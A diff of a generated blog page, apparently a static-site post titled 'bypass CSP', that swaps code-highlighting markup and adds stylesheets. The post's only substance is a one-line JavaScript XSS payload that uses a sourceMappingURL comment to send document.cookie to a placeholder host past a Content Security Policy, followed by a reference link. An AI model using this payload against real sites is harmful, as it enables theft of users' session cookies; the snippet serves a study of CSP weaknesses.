@@ -294,7 +294,8 @@
     <!-- Custom Head -->
     
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
     
@@ -477,7 +478,8 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h2 id="bypass-CSP"><a href="#bypass-CSP" class="headerlink" title="bypass CSP"></a>bypass CSP</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;script&gt;//#  sourceMappingURL=https://request/?$&#123;escape(document.cookie)&#125;&lt;/script&gt;'</span>)</div></pre></td></tr></table></figure>
+        <h2 id="bypass-CSP"><a href="#bypass-CSP" class="headerlink" title="bypass CSP"></a>bypass CSP</h2><pre class="line-numbers language-javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;script>//#  sourceMappingURL=https://request/?${escape(document.cookie)}&lt;/script>'</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://segmentfault.com/a/1190000007544398" target="_blank" rel="external">https://segmentfault.com/a/1190000007544398</a> (哈哈哈，这个人和我一样)</p>
 
         
